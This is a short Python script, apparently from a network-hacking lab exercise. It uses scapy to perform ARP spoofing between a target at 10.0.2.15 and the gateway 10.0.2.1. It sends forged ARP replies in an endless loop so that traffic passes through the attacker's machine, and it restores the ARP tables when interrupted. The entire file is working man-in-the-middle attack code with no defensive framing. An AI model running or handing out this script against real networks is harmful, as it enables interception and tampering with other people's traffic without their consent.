#!/usr/bin/env python



import scapy.all as scapy

import time

import sys





def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)  # Sending the IP

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcasting the IP to everyone

    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # Getting only answered list



    return answered_list[0][1].hwsrc





def spoof(target_ip, spoof_id):

    target_mac = get_mac(target_ip)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac , psrc=spoof_id) # Telling the victim that I am the router

    # op = 2(op=1 request,op=2 response), pdst=victims ip , hwdst=victims mac address, psrc= who you are



    scapy.send(packet, verbose=False)





def restore(destination_ip, source_ip):

    destination_mac = get_mac(destination_ip)

    source_mac = get_mac(source_ip)

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc= source_mac) # Scappy automatticlly sending own mac address if wont specify hwsrc

    scapy.send(packet, count=4, verbose=False)





target_ip = "10.0.2.15"

gateway_ip = "10.0.2.1"





sent_packets_count = 0

try:

    while True:

        spoof(target_ip , gateway_ip)

        spoof(gateway_ip, target_ip)

        sent_packets_count += 2

        print("\r [+] Packets sent: "+str(sent_packets_count)), # add to buffer ,works for python 2

        sys.stdout.flush()# flush the buffer to print

        time.sleep(2)

except KeyboardInterrupt:

    print("\n [-] Detected CTRL + C ...... Resetting ARP tables.")

    restore(target_ip, gateway_ip)

    restore(gateway_ip, target_ip)
